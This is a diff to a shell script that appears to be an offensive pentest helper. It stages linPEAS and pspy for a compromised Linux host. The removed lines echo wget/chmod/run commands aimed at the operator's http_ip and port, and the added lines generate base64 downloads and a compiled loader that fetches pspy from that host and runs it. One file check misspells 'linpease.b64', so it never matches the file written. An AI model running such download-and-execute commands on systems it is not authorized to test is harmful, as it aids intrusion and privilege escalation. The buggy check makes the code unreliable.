@@ -41,9 +41,10 @@ download_linpeas() {
         linpeas_link=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep linpeas.sh | grep -oP 'href="\K[^"]+')
         wget https://github.com$linpeas_link
     fi
-    echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
-    echo "chmod +x linpeas.sh"
-    echo "./linpeas.sh"
+    if [[ ! -f "linpease.b64" ]]; then
+        base64 -w0 linpeas.sh > linpeas.b64
+    fi
+    generate_linux_download "linpeas.b64"
 }
 
 get_run_linpeas_commands() {
@@ -95,4 +96,8 @@ download_pspy() {
     generate_linux_download "$pspy_file"
     echo "chmod +x $pspy_file"
     echo "./$pspy_file"
+    compile_loader
+    if [[ ! -z $loader_file ]]; then
+        echo "./$loader_file http://$http_ip:$http_port/$pspy_file"
+    fi
 }
